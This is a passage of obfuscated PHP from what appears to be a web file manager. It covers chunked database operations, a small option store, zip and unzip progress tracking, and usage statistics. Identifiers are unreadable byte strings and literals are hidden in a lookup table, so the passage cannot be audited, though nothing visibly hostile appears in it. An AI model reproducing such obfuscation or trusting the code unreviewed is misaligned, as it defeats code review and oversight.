$this->execute($–µĞ¬ã“); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($ãí¥×² = false, $¿èâ•–œ = false) { $this->_chunkEvent = $ãí¥×²; $this->_chunkEventParam = $¿èâ•–œ; } private function chunkEventCheck($ˆ¯îØÖ) { if (!$this->_chunkEvent) { return; } $›é›Àß = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $›é›Àß[$_SERVER[ÏÒ Ì„][378]] = $ˆ¯îØÖ; Hook::trigger($this->_chunkEvent, $›é›Àß); } public function addAll($¾Æ‘Äı, $°¿ó•Š– = array(), $¯ËÍ®‹Œ = false) { $•Îì‡ƒ¯ =& $_SERVER[ÏÒ Ì„]; ignore_timeout(); $İµßŞŞ§ = self::SQL_WHERE_IN_CHUNK; if (empty($¾Æ‘Äı)) { $this->error = think_lang($•Îì‡ƒ¯[269]); return !1; } $°¿ó•Š– = $this->_parseOptions($°¿ó•Š–); foreach ($¾Æ‘Äı as $š¼ò—õÇ => $óÅ¸°Ø) { $¾Æ‘Äı[$š¼ò—õÇ] = $this->_facade($óÅ¸°Ø); $this->_beforeInsert($¾Æ‘Äı[$š¼ò—õÇ], $°¿ó•Š–); } if (method_exists($this->db, $•Îì‡ƒ¯[270])) { for ($”Ÿ†—¹í = 0; $”Ÿ†—¹í < count($¾Æ‘Äı); $”Ÿ†—¹í += $İµßŞŞ§) { $Š§’ğ”‰ = array_slice($¾Æ‘Äı, $”Ÿ†—¹í, $İµßŞŞ§); if (!is_array($Š§’ğ”‰) || count($Š§’ğ”‰) == 0) { break; } $™Ö¬Ôëç = $this->db->insertAll($Š§’ğ”‰, $°¿ó•Š–, $¯ËÍ®‹Œ); $this->chunkEventCheck(count($Š§’ğ”‰)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($¾Æ‘Äı as $š¼ò—õÇ => $óÅ¸°Ø) { $™Ö¬Ôëç = $this->db->insert($óÅ¸°Ø, $°¿ó•Š–, $¯ËÍ®‹Œ); } $this->commit(); } if (!1 !== $™Ö¬Ôëç) { $Ö´ã¢§† = $this->getLastInsID(); if ($Ö´ã¢§†) { return $Ö´ã¢§†; } } return $™Ö¬Ôëç; } public function save($Ñ¨Ù™Ã± = '', $œ”ìÉÁ† = array()) { $ò›ÒñµÒ =& $_SERVER[ÏÒ Ì„]; $½á–Ó° = self::SQL_WHERE_IN_CHUNK; $’ï¬ÕÖ = $this->optionsValue(); $óÇÌ¼ê“ = $this->findWhereField($’ï¬ÕÖ); if (!$óÇÌ¼ê“) { return parent::save($Ñ¨Ù™Ã±, $œ”ìÉÁ†); } $¤ŸÅÉÓµ = 0; $öÑ±ÑÏ¤ = $’ï¬ÕÖ[$ò›ÒñµÒ[273]][$óÇÌ¼ê“][1]; $öÑ±ÑÏ¤ = is_array($öÑ±ÑÏ¤) ? $öÑ±ÑÏ¤ : array(); $Ç‰¼ş¬‘ = count($öÑ±ÑÏ¤); for ($†”±ÇÔ¿ = 0; $†”±ÇÔ¿ < $Ç‰¼ş¬‘; $†”±ÇÔ¿ += $½á–Ó°) { $Ÿ“®Æ® = array_slice($öÑ±ÑÏ¤, $†”±ÇÔ¿, $½á–Ó°); if (!is_array($Ÿ“®Æ®) || count($Ÿ“®Æ®) == 0) { break; } $’ï¬ÕÖ[$ò›ÒñµÒ[273]][$óÇÌ¼ê“][1] = $Ÿ“®Æ®; $this->optionsValue($’ï¬ÕÖ); $¤ŸÅÉÓµ += parent::save($Ñ¨Ù™Ã±, $œ”ìÉÁ†); $this->chunkEventCheck(count($Ÿ“®Æ®)); } $this->chunkEventSet(); return $¤ŸÅÉÓµ; } public function add($ÍÒÆ¨â— = '', $‡ÈËÀì© = array(), $”şÂŒ» = false) { if ($this->addTaskStatus && is_array($ÍÒÆ¨â—)) { $this->addTaskData[] = $ÍÒÆ¨â—; return; } return parent::add($ÍÒÆ¨â—, $‡ÈËÀì©, $”şÂŒ»); } public function parseWhereLike($ÄœŞ–è, $ä”¨Å¶° = '', $•¶›ÁÜÔ = false, &$µ©¿çä = false) { $Íòí©ï =& $_SERVER[ÏÒ Ì„]; $ÂÒËë“¥ = $GLOBALS[$Íòí©ï[6]][$Íòí©ï[379]]; if (!$ÂÒËë“¥[$Íòí©ï[380]]) { return $ÄœŞ–è; } if (!is_array($ÄœŞ–è)) { return $ÄœŞ–è; } $ô£éš¦ = array(); $•Åª¯Í¹ = 0; foreach ($ÄœŞ–è as $İ€Á‘¶ => $ÛÜşå›) { if (is_array($ÛÜşå›) && count($ÛÜşå›) == 2 && $ÛÜşå›[0] == $Íòí©ï[381] && is_string($ÛÜşå›[1]) && substr($ÛÜşå›[1], 0, 1) == $Íòí©ï[382] && substr($ÛÜşå›[1], strlen($ÛÜşå›[1]) - 1, 1) == $Íòí©ï[382]) { $µ©¿çä = !0; $üØô†Ñ = is_string($İ€Á‘¶) ? $İ€Á‘¶ : $ä”¨Å¶°; $†Ë£±êê = substr($ÛÜşå›[1], 1, strlen($ÛÜşå›[1]) - 2); $†Ë£±êê = $this->db->escapeString($†Ë£±êê); if (!strpos($üØô†Ñ, $Íòí©ï[95])) { $üØô†Ñ = $Íòí©ï[383] . $üØô†Ñ . $Íòí©ï[383]; } $ŒÛ‹–Û¬ = $Íòí©ï[182] . $†Ë£±êê . $Íòí©ï[182]; if ($ÂÒËë“¥[$Íòí©ï[384]]) { $ŒÛ‹–Û¬ = $Íòí©ï[385] . $†Ë£±êê . $Íòí©ï[386]; if ($ÂÒËë“¥[$Íòí©ï[387]]) { $ŒÛ‹–Û¬ = $Íòí©ï[386] . $†Ë£±êê . $Íòí©ï[385]; } } $ô£éš¦[$•Åª¯Í¹] = $Íòí©ï[388] . $üØô†Ñ . $Íòí©ï[389] . $ŒÛ‹–Û¬ . $Íòí©ï[390]; $•Åª¯Í¹++; continue; } if (is_array($ÛÜşå›)) { $ä”¨Å¶° = is_string($İ€Á‘¶) ? $İ€Á‘¶ : $ä”¨Å¶°; $ÛÜşå› = $this->parseWhereLike($ÛÜşå›, $ä”¨Å¶°, !0, $µ©¿çä); } if (is_numeric($İ€Á‘¶)) { $ô£éš¦[$•Åª¯Í¹] = $ÛÜşå›; $•Åª¯Í¹++; } else { $ô£éš¦[$İ€Á‘¶] = $ÛÜşå›; } } if ($µ©¿çä && !$•¶›ÁÜÔ) { } return $ô£éš¦; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($¸Øµ€×¬ = array()) { $úç›¾’Ô =& $_SERVER[ÏÒ Ì„]; $¬íÍè‡Ğ = self::SQL_WHERE_IN_CHUNK; $‡À¼Ì‚€ = $this->optionsValue(); $ãÒ†Ûû = $this->findWhereField($‡À¼Ì‚€); if (!$ãÒ†Ûû || isset($‡À¼Ì‚€[$úç›¾’Ô[290]]) || isset($‡À¼Ì‚€[$úç›¾’Ô[351]])) { return parent::select($¸Øµ€×¬); } $ˆ’¶Ïö“ = $‡À¼Ì‚€[$úç›¾’Ô[273]][$ãÒ†Ûû][1]; $ˆ’¶Ïö“ = is_array($ˆ’¶Ïö“) ? $ˆ’¶Ïö“ : array(); $‰¬ì·ï¨ = null; for ($Ò‡½ùâÕ = 0; $Ò‡½ùâÕ < count($ˆ’¶Ïö“); $Ò‡½ùâÕ += $¬íÍè‡Ğ) { $¼İªíÛ¡ = array_slice($ˆ’¶Ïö“, $Ò‡½ùâÕ, $¬íÍè‡Ğ); if (!is_array($¼İªíÛ¡) || count($¼İªíÛ¡) == 0) { break; } $‡À¼Ì‚€[$úç›¾’Ô[273]][$ãÒ†Ûû][1] = $¼İªíÛ¡; $this->optionsValue($‡À¼Ì‚€); $Ê¹Ù°Öã = parent::select($¸Øµ€×¬); if (!$Ê¹Ù°Öã) { continue; } $‰¬ì·ï¨ = is_array($‰¬ì·ï¨) ? $‰¬ì·ï¨ : array(); $‰¬ì·ï¨ = array_merge($‰¬ì·ï¨, $Ê¹Ù°Öã); } return $‰¬ì·ï¨; } public function delete($ÚÚâ•Æ¬ = array()) { $øØÌÂäû =& $_SERVER[ÏÒ Ì„]; $ñ•Ú÷Œ = self::SQL_WHERE_IN_CHUNK; $²ª†×„ = $this->optionsValue(); $±úßşŒÛ = $this->findWhereField($²ª†×„); if (!$±úßşŒÛ) { return parent::delete($ÚÚâ•Æ¬); } $¼ğı©Ñ„ = 0; $àèÛ®×ê = $²ª†×„[$øØÌÂäû[273]][$±úßşŒÛ][1]; $àèÛ®×ê = is_array($àèÛ®×ê) ? $àèÛ®×ê : array(); for ($ê “©ö = 0; $ê “©ö < count($àèÛ®×ê); $ê “©ö += $ñ•Ú÷Œ) { $òÌ—ÚÒÁ = array_slice($àèÛ®×ê, $ê “©ö, $ñ•Ú÷Œ); if (!is_array($òÌ—ÚÒÁ) || count($òÌ—ÚÒÁ) == 0) { break; } $²ª†×„[$øØÌÂäû[273]][$±úßşŒÛ][1] = $òÌ—ÚÒÁ; $this->optionsValue($²ª†×„); $¼ğı©Ñ„ += parent::delete($ÚÚâ•Æ¬); } return $¼ğı©Ñ„; } private function findWhereField($„íË›èÁ) { $ŸÃ…‰ª =& $_SERVER[ÏÒ Ì„]; $Ì—ÀøÂ = self::SQL_WHERE_IN_CHUNK; if (!is_array($„íË›èÁ) || !is_array($„íË›èÁ[$ŸÃ…‰ª[273]])) { return !1; } foreach ($„íË›èÁ[$ŸÃ…‰ª[273]] as $—¶Ô„¾Š => $‘¸÷Û«ã) { if (is_array($‘¸÷Û«ã) && isset($‘¸÷Û«ã[0]) && is_string($‘¸÷Û«ã[0]) && strtolower($‘¸÷Û«ã[0]) == $ŸÃ…‰ª[7] && is_array($‘¸÷Û«ã[1]) && count($‘¸÷Û«ã[1]) > $Ì—ÀøÂ) { ignore_timeout(); return $—¶Ô„¾Š; } } return !1; } public function setMasterDB($Ÿ§—ÉûÍ = true) { think_config($_SERVER[ÏÒ Ì„][391], $Ÿ§—ÉûÍ); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\x73\x74\145\x6d\x4f\160\x74\x69\157\x6e"; public $field = array(); public function listData($‘Û¸¾Ù = false, $½Šàæôê = "\155\157\x64\151\146\171\x54\x69\155\145", $¦ØÛÏé‚ = false) { $ÒÃ¸şäŠ = Model($this->modelType)->get(!1, $this->optionType, !0); $ëÆÅÍş = array_values($ÒÃ¸şäŠ); if ($ëÆÅÍş && $ëÆÅÍş[0] && !is_array($ëÆÅÍş[0])) { Model($this->modelType)->cacheRemove($this->optionType); $ÒÃ¸şäŠ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$ÒÃ¸şäŠ) { return $‘Û¸¾Ù ? null : array(); } if (!$‘Û¸¾Ù) { $ÒÃ¸şäŠ = array_filter(array_values($ÒÃ¸şäŠ)); return array_sort_by($ÒÃ¸şäŠ, $½Šàæôê, $¦ØÛÏé‚); } return $ÒÃ¸şäŠ[$_SERVER[ÏÒ Ì„][392] . $‘Û¸¾Ù]; } public function insert($€Ş„ˆÉÑ) { $§ÉÖÊ²Ó =& $_SERVER[ÏÒ Ì„]; $€Ş„ˆÉÑ = array_field_key($€Ş„ˆÉÑ, $this->field); $şÂµÛ•Æ = Model($this->modelType)->get($§ÉÖÊ²Ó[393], $this->optionType . $§ÉÖÊ²Ó[394]); $şÂµÛ•Æ = $şÂµÛ•Æ ? $şÂµÛ•Æ : 0; $€Ş„ˆÉÑ[$§ÉÖÊ²Ó[395]] = ++$şÂµÛ•Æ; $€Ş„ˆÉÑ[$§ÉÖÊ²Ó[194]] = time(); $€Ş„ˆÉÑ[$§ÉÖÊ²Ó[84]] = time(); Model($this->modelType)->set($§ÉÖÊ²Ó[393], $şÂµÛ•Æ, $this->optionType . $§ÉÖÊ²Ó[394]); Model($this->modelType)->set($§ÉÖÊ²Ó[392] . $şÂµÛ•Æ, $€Ş„ˆÉÑ, $this->optionType); return $şÂµÛ•Æ; } public function update($±æÕÓ§Ï, $Õ»ŠÙé÷) { $Ë¥Š„ş =& $_SERVER[ÏÒ Ì„]; $Õ»ŠÙé÷ = array_field_key($Õ»ŠÙé÷, $this->field); $ú››¥ìÉ = $this->listData($±æÕÓ§Ï); if (!$ú››¥ìÉ || !$±æÕÓ§Ï) { return !1; } $Õ»ŠÙé÷ = array_merge($ú››¥ìÉ, $Õ»ŠÙé÷); $Õ»ŠÙé÷[$Ë¥Š„ş[84]] = time(); return Model($this->modelType)->set($Ë¥Š„ş[392] . $±æÕÓ§Ï, $Õ»ŠÙé÷, $this->optionType); } public function remove($ø¡Ë¾) { if (!$ø¡Ë¾) { return !1; } return Model($this->modelType)->remove($_SERVER[ÏÒ Ì„][392] . $ø¡Ë¾, $this->optionType); } public function clear() { $ô¹Ê«èû =& $_SERVER[ÏÒ Ì„]; Model($this->modelType)->remove($ô¹Ê«èû[393], $this->optionType . $ô¹Ê«èû[394]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($´Î–Åë«, $Úúå»ô½) { if (!$Úúå»ô½) { return !1; } $¼åğ¥”¹ = $this->listData(); $¼åğ¥”¹ = array_to_keyvalue($¼åğ¥”¹, $´Î–Åë«); return isset($¼åğ¥”¹[$Úúå»ô½]) ? $¼åğ¥”¹[$Úúå»ô½] : !1; } public function findByName($şÊµˆÙ) { return $this->findByKey($_SERVER[ÏÒ Ì„][28], $şÊµˆÙ); } protected function resetData($±ÒÌ×ı) { $Ÿñ‡› =& $_SERVER[ÏÒ Ì„]; $±ÒÌ×ı = is_array($±ÒÌ×ı) ? $±ÒÌ×ı : array(); $ş¤ÈÆÅ• = array(); for ($ÚÁ£é¿ó = 0; $ÚÁ£é¿ó < count($±ÒÌ×ı); $ÚÁ£é¿ó++) { $ş¤ÈÆÅ•[$Ÿñ‡›[392] . $±ÒÌ×ı[$ÚÁ£é¿ó][$Ÿñ‡›[395]]] = $±ÒÌ×ı[$ÚÁ£é¿ó]; } return Model($this->modelType)->set($ş¤ÈÆÅ•, !1, $this->optionType); } private function getAutoName($Û–ùõ§ó) { $­ËÓ¿‹Ù = array_to_keyvalue($this->listData(), $_SERVER[ÏÒ Ì„][28]); if (!$­ËÓ¿‹Ù || !isset($­ËÓ¿‹Ù[$Û–ùõ§ó])) { return $Û–ùõ§ó; } for ($­‚â«†ä = 1; $­‚â«†ä < count($­ËÓ¿‹Ù); $­‚â«†ä++) { $çÑ”‰³€ = $Û–ùõ§ó . "\x28{$­‚â«†ä}\x29"; if (!isset($­ËÓ¿‹Ù[$çÑ”‰³€])) { return $çÑ”‰³€; } } return $çÑ”‰³€; } } goto dš£ÖØóÑß; eàèò…ÀÜ”: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $×Ë³íÛÜ =& $_SERVER[ÏÒ Ì„]; parent::startAfter(); Hook::bind($×Ë³íÛÜ[1666], array($this, $×Ë³íÛÜ[1667])); Hook::bind($×Ë³íÛÜ[1122], array($this, $×Ë³íÛÜ[1668])); $âºÒÖä =& $this->task; $âºÒÖä[$×Ë³íÛÜ[1669]] = $×Ë³íÛÜ[1127]; if (!$âºÒÖä[$×Ë³íÛÜ[1478]]) { $âºÒÖä[$×Ë³íÛÜ[1478]] = LNG($×Ë³íÛÜ[1670]); } } protected function endAfter() { $˜õ¨×ÜŠ =& $_SERVER[ÏÒ Ì„]; parent::endAfter(); Hook::unbind($˜õ¨×ÜŠ[1666], array($this, $˜õ¨×ÜŠ[1667])); Hook::unbind($˜õ¨×ÜŠ[1122], array($this, $˜õ¨×ÜŠ[1668])); } public function updateAfter() { $ï£ëÕâ =& $_SERVER[ÏÒ Ì„]; $´ÖÍŞ =& $this->task; if (!$´ÖÍŞ[$ï£ëÕâ[1057]] || !$´ÖÍŞ[$ï£ëÕâ[753]]) { return; } if ($´ÖÍŞ[$ï£ëÕâ[1669]] == $ï£ëÕâ[1127]) { $Êğş¥æ = 0; if ($´ÖÍŞ[$ï£ëÕâ[1625]]) { $Êğş¥æ = $´ÖÍŞ[$ï£ëÕâ[1626]] / $´ÖÍŞ[$ï£ëÕâ[1625]]; } $´ÖÍŞ[$ï£ëÕâ[1580]] = $Êğş¥æ * 0.3; } else { if ($´ÖÍŞ[$ï£ëÕâ[1669]] == $ï£ëÕâ[311]) { $Êğş¥æ = $´ÖÍŞ[$ï£ëÕâ[1579]] / $´ÖÍŞ[$ï£ëÕâ[1057]]; $´ÖÍŞ[$ï£ëÕâ[1580]] = 0.3 + $Êğş¥æ * 0.4; } else { if ($´ÖÍŞ[$ï£ëÕâ[1669]] == $ï£ëÕâ[107]) { $’öéá = 0; if ($´ÖÍŞ[$ï£ëÕâ[1627]] == $ï£ëÕâ[107]) { $’öéá = $´ÖÍŞ[$ï£ëÕâ[1626]]; } $Êğş¥æ = ($´ÖÍŞ[$ï£ëÕâ[1630]] + $’öéá) / $´ÖÍŞ[$ï£ëÕâ[753]]; $´ÖÍŞ[$ï£ëÕâ[1580]] = 0.3 + 0.4 + $Êğş¥æ * 0.3; } } } if ($´ÖÍŞ[$ï£ëÕâ[1580]] > 0) { $é´ôº‹Õ = timeFloat() - $´ÖÍŞ[$ï£ëÕâ[779]] - $´ÖÍŞ[$ï£ëÕâ[1583]]; $´ÖÍŞ[$ï£ëÕâ[1584]] = $é´ôº‹Õ * (1 - $´ÖÍŞ[$ï£ëÕâ[1580]]) / $´ÖÍŞ[$ï£ëÕâ[1580]]; } } public function addFile($¥‡ùÎİØ) { $ŸôÀïã« =& $_SERVER[ÏÒ Ì„]; $İğÅûµ  =& $this->task; $ÕÀÅ†± = IO::info($¥‡ùÎİØ); $İğÅûµ [$ŸôÀïã«[1623]] = $ÕÀÅ†±[$ŸôÀïã«[28]]; $İğÅûµ [$ŸôÀïã«[1625]] = $ÕÀÅ†±[$ŸôÀïã«[78]]; $İğÅûµ [$ŸôÀïã«[1626]] = 0; $İğÅûµ [$ŸôÀïã«[1059]] = $ŸôÀïã«[1645]; $İğÅûµ [$ŸôÀïã«[1627]] = $ŸôÀïã«[1127]; $İğÅûµ [$ŸôÀïã«[753]] = $ÕÀÅ†±[$ŸôÀïã«[78]]; $İğÅûµ [$ŸôÀïã«[1057]] = 1; $Ó»Õ‡ò© = 0; $İğÅûµ [$ŸôÀïã«[1634]] = array($ŸôÀïã«[1635] => $Ó»Õ‡ò© + 1, $ŸôÀïã«[415] => $ÕÀÅ†±[$ŸôÀïã«[28]], $ŸôÀïã«[76] => $ÕÀÅ†±[$ŸôÀïã«[76]], $ŸôÀïã«[513] => $ÕÀÅ†±[$ŸôÀïã«[513]] ? $ÕÀÅ†±[$ŸôÀïã«[513]] : $ÕÀÅ†±[$ŸôÀïã«[76]]); $this->update(); } public function unzipAfter($ÉÊó–ˆ) { $Õğì¼…š =& $_SERVER[ÏÒ Ì„]; $ÛğêĞÓŞ =& $this->task; $ÛğêĞÓŞ[$Õğì¼…š[1669]] = $Õğì¼…š[107]; $¤¤»ö£š = IO::infoWithChildren($ÉÊó–ˆ); $Û¡ï™Ğ™ = 0; $ÛğêĞÓŞ[$Õğì¼…š[1634]] = array($Õğì¼…š[1635] => $Û¡ï™Ğ™ + 1, $Õğì¼…š[415] => $¤¤»ö£š[$Õğì¼…š[28]], $Õğì¼…š[76] => $¤¤»ö£š[$Õğì¼…š[76]], $Õğì¼…š[513] => $¤¤»ö£š[$Õğì¼…š[513]] ? $¤¤»ö£š[$Õğì¼…š[513]] : $¤¤»ö£š[$Õğì¼…š[76]]); if ($¤¤»ö£š[$Õğì¼…š[29]] == $Õğì¼…š[193]) { $ÛğêĞÓŞ[$Õğì¼…š[1057]] = 1; } else { $ÛğêĞÓŞ[$Õğì¼…š[1057]] = $¤¤»ö£š[$Õğì¼…š[81]][$Õğì¼…š[79]]; } $ÛğêĞÓŞ[$Õğì¼…š[1059]] = $Õğì¼…š[33]; $ÛğêĞÓŞ[$Õğì¼…š[1627]] = 0; $ÛğêĞÓŞ[$Õğì¼…š[1579]] = 0; $ÛğêĞÓŞ[$Õğì¼…š[1625]] = 0; $ÛğêĞÓŞ[$Õğì¼…š[1626]] = 0; $ÛğêĞÓŞ[$Õğì¼…š[1623]] = $Õğì¼…š[33]; $ÛğêĞÓŞ[$Õğì¼…š[1630]] = 0; $ÛğêĞÓŞ[$Õğì¼…š[753]] = $¤¤»ö£š[$Õğì¼…š[78]]; $this->update(); self::log($Õğì¼…š[1671] . json_encode(array($ÛğêĞÓŞ, $¤¤»ö£š))); } public function nameParse($â»¾°Óì) { $¢²’³šÑ =& $_SERVER[ÏÒ Ì„]; $ççÒ«¿ =& $this->task; if ($ççÒ«¿[$¢²’³šÑ[1669]] == $¢²’³šÑ[1127]) { $ççÒ«¿[$¢²’³šÑ[1669]] = $¢²’³šÑ[311]; $ççÒ«¿[$¢²’³šÑ[1630]] = 0; $ççÒ«¿[$¢²’³šÑ[753]] = 0; } $›‰’şöš = get_path_this($â»¾°Óì); if (strstr($›‰’şöš, $¢²’³šÑ[95])) { $ççÒ«¿[$¢²’³šÑ[1579]] += 1; $ççÒ«¿[$¢²’³šÑ[1057]] += 1; } $ççÒ«¿[$¢²’³šÑ[1623]] = $â»¾°Óì; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $ºØ”Úˆ„ =& $_SERVER[ÏÒ Ì„]; parent::startAfter(); Hook::bind($ºØ”Úˆ„[1672], array($this, $ºØ”Úˆ„[1667])); $ÏæÅ‹ÎÎ =& $this->task; $ÏæÅ‹ÎÎ[$ºØ”Úˆ„[1669]] = $ºØ”Úˆ„[1127]; if (!$ÏæÅ‹ÎÎ[$ºØ”Úˆ„[1478]]) { $ÏæÅ‹ÎÎ[$ºØ”Úˆ„[1478]] = LNG($ºØ”Úˆ„[1673]); } } protected function endAfter() { $½¯ëèÀâ =& $_SERVER[ÏÒ Ì„]; parent::endAfter(); Hook::unbind($½¯ëèÀâ[1672], array($this, $½¯ëèÀâ[1667])); } public function updateAfter() { $‘Å–Ş«³ =& $_SERVER[ÏÒ Ì„]; $§¸–ûÁø =& $this->task; if (!$§¸–ûÁø[$‘Å–Ş«³[1057]] || !$§¸–ûÁø[$‘Å–Ş«³[753]]) { return; } if ($§¸–ûÁø[$‘Å–Ş«³[1669]] == $‘Å–Ş«³[1127]) { $ùàÎ•ë = $§¸–ûÁø[$‘Å–Ş«³[1626]]; if ($§¸–ûÁø[$‘Å–Ş«³[1627]] != $‘Å–Ş«³[1127]) { $ùàÎ•ë = 0; } $âîƒÀ› = ($§¸–ûÁø[$‘Å–Ş«³[1630]] + $ùàÎ•ë) / $§¸–ûÁø[$‘Å–Ş«³[753]]; $§¸–ûÁø[$‘Å–Ş«³[1580]] = $âîƒÀ› * 0.3; } else { if ($§¸–ûÁø[$‘Å–Ş«³[1669]] == $‘Å–Ş«³[311]) { $âîƒÀ› = $§¸–ûÁø[$‘Å–Ş«³[1579]] / $§¸–ûÁø[$‘Å–Ş«³[1057]]; $§¸–ûÁø[$‘Å–Ş«³[1580]] = 0.3 + $âîƒÀ› * 0.5; } else { if ($§¸–ûÁø[$‘Å–Ş«³[1669]] == $‘Å–Ş«³[107]) { $âîƒÀ› = 0; if ($§¸–ûÁø[$‘Å–Ş«³[1625]]) { $âîƒÀ› = $§¸–ûÁø[$‘Å–Ş«³[1626]] / $§¸–ûÁø[$‘Å–Ş«³[1625]]; } $§¸–ûÁø[$‘Å–Ş«³[1580]] = 0.3 + 0.5 + $âîƒÀ› * 0.2; } } } if ($§¸–ûÁø[$‘Å–Ş«³[1580]] > 0) { $×¨¹Çßî = timeFloat() - $§¸–ûÁø[$‘Å–Ş«³[779]] - $§¸–ûÁø[$‘Å–Ş«³[1583]]; $§¸–ûÁø[$‘Å–Ş«³[1584]] = $×¨¹Çßî * (1 - $§¸–ûÁø[$‘Å–Ş«³[1580]]) / $§¸–ûÁø[$‘Å–Ş«³[1580]]; } } public function copyFileStart($›¤ÙÃõ, $ç‹ñ›‡â, $ÀïûÄÈ´, $™Şó±Á„, $‚àˆªÙÏ, $¨«ãÃ·§) { $®¥º˜îï =& $_SERVER[ÏÒ Ì„]; parent::copyFileStart($›¤ÙÃõ, $ç‹ñ›‡â, $ÀïûÄÈ´, $™Şó±Á„, $‚àˆªÙÏ, $¨«ãÃ·§); $˜ı¹òß” =& $this->task; if ($˜ı¹òß”[$®¥º˜îï[1669]] == $®¥º˜îï[311]) { $˜ı¹òß”[$®¥º˜îï[1669]] = $®¥º˜îï[107]; } $this->update(); } public function copyFileEnd($Ò­ÊŞØ, $®èÎÒíí, $³ü¶¯çÀ, $×Ú–ÕÏí, $£ßÙó‹, $ìèÁŸ«) { $ÆÊ¿Å÷ë =& $_SERVER[ÏÒ Ì„]; $œ¥òŠÀ =& $this->task; $œ¥òŠÀ[$ÆÊ¿Å÷ë[1626]] = $œ¥òŠÀ[$ÆÊ¿Å÷ë[1625]]; $œ¥òŠÀ[$ÆÊ¿Å÷ë[1630]] += $œ¥òŠÀ[$ÆÊ¿Å÷ë[1625]]; $œ¥òŠÀ[$ÆÊ¿Å÷ë[1627]] = $ÆÊ¿Å÷ë[33]; $this->update(); } public function nameParse($úëĞçı) { $â¨Ú ÒÀ =& $_SERVER[ÏÒ Ì„]; $ãµ¸ãˆ =& $this->task; if ($ãµ¸ãˆ[$â¨Ú ÒÀ[1579]] < $ãµ¸ãˆ[$â¨Ú ÒÀ[1057]]) { $«­çÒ¼ò = get_path_this($úëĞçı); if (strstr($«­çÒ¼ò, $â¨Ú ÒÀ[95])) { $ãµ¸ãˆ[$â¨Ú ÒÀ[1579]] += 1; } } if ($ãµ¸ãˆ[$â¨Ú ÒÀ[1669]] == $â¨Ú ÒÀ[1127]) { $ãµ¸ãˆ[$â¨Ú ÒÀ[1669]] = $â¨Ú ÒÀ[311]; } $ãµ¸ãˆ[$â¨Ú ÒÀ[1623]] = $úëĞçı; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($€©Ò›ªÒ) { $ÄÄúş =& $_SERVER[ÏÒ Ì„]; $çÌ›çÂÁ = array($ÄÄúş[588] => array($ÄÄúş[29] => $ÄÄúş[1674], $ÄÄúş[271] => array($ÄÄúş[222], $ÄÄúş[755], $ÄÄúş[1675], $ÄÄúş[1676])), $ÄÄúş[1677] => array($ÄÄúş[29] => $ÄÄúş[1678], $ÄÄúş[271] => array($ÄÄúş[222], $ÄÄúş[753], $ÄÄúş[1679], $ÄÄúş[1680], $ÄÄúş[1681]))); if (!isset($çÌ›çÂÁ[$€©Ò›ªÒ])) { return !1; } $this->optionType = $çÌ›çÂÁ[$€©Ò›ªÒ][$ÄÄúş[29]]; $this->field = $çÌ›çÂÁ[$€©Ò›ªÒ][$ÄÄúş[271]]; return !0; } public function listData($’óÎàß¬ = false, $Øº†¡î¤ = "\x6d\x6f\x64\x69\x66\x79\x54\x69\x6d\145", $İÂ±¸îî = false) { return parent::listData($’óÎàß¬, $Øº†¡î¤, $İÂ±¸îî); } public function trendList($’‚á¸äª) { $±ğâ¦¾² =& $_SERVER[ÏÒ Ì„]; $—¾Éö… = $this->listData(); if ($—¾Éö…) { $çäêé‹ù = end($—¾Éö…); $ª—‡‚Â© = date($±ğâ¦¾²[1682], strtotime($±ğâ¦¾²[1683])); if ($çäêé‹ù[$±ğâ¦¾²[222]] == $ª—‡‚Â©) { return $—¾Éö…; } $—ƒÇ§ëÃ = strtotime($çäêé‹ù[$±ğâ¦¾²[222]]); } if (!isset($—ƒÇ§ëÃ)) { $¡üñ”“‘ = $’‚á¸äª == $±ğâ¦¾²[588] ? $±ğâ¦¾²[532] : $±ğâ¦¾²[822]; $—ƒÇ§ëÃ = Model($¡üñ”“‘)->min($±ğâ¦¾²[194]); } $¤õ¿•ö¹ = $±ğâ¦¾²[1684] . ucfirst($’‚á¸äª); $¸´ÊÁ¤ = $this->dateList($—ƒÇ§ëÃ); foreach ($¸´ÊÁ¤ as $ª—‡‚Â©) { $this->{$¤õ¿•ö¹}($ª—‡‚Â©); } return $this->listData(); } private function dateList($æİŒÇ¿Õ) { $åÙ×øÆ… =& $_SERVER[ÏÒ Ì„]; $€÷§•¡â = $æİŒÇ¿Õ; $Ë¼öÙ–ó = strtotime($åÙ×øÆ…[1683]); $¢şìã‚ = array(); while ($€÷§•¡â <= $Ë¼öÙ–ó) { $¢şìã‚[] = date($åÙ×øÆ…[1682], $€÷§•¡â); $€÷§•¡â = strtotime($åÙ×øÆ…[1685], $€÷§•¡â); } return $¢şìã‚; } public function _recordUser($¾ĞÄ×à = '') { $½…ëÑ‡ï =& $_SERVER[ÏÒ Ì„]; $¹©ã½ñ = strtotime(date($½…ëÑ‡ï[1686], strtotime($¾ĞÄ×à))); $ŞÓúÓıí = strtotime(date($½…ëÑ‡ï[1687], strtotime($¾ĞÄ×à))); $§­Øğ°î = array($½…ëÑ‡ï[194] => array($½…ëÑ‡ï[1007], $ŞÓúÓıí)); $ûÕÜ®’€ = Model($½…ëÑ‡ï[532])->where($§­Øğ°î)->count($½…ëÑ‡ï[1578]); $§­Øğ°î[$½…ëÑ‡ï[194]] = array($½…ëÑ‡ï[331], array($¹©ã½ñ, $ŞÓúÓıí)); $¶¿İç¾‰ = Model($½…ëÑ‡ï[532])->where($§­Øğ°î)->count($½…ëÑ‡ï[1578]); $§­Øğ°î[$½…ëÑ‡ï[29]] = $½…ëÑ‡ï[1688]; $”ß§Œ¹© = Model($½…ëÑ‡ï[1689])->where($§­Øğ°î)->count($½…ëÑ‡ï[1690]); $¾´ÑÅÖĞ = array($½…ëÑ‡ï[222] => $¾ĞÄ×à, $½…ëÑ‡ï[755] => 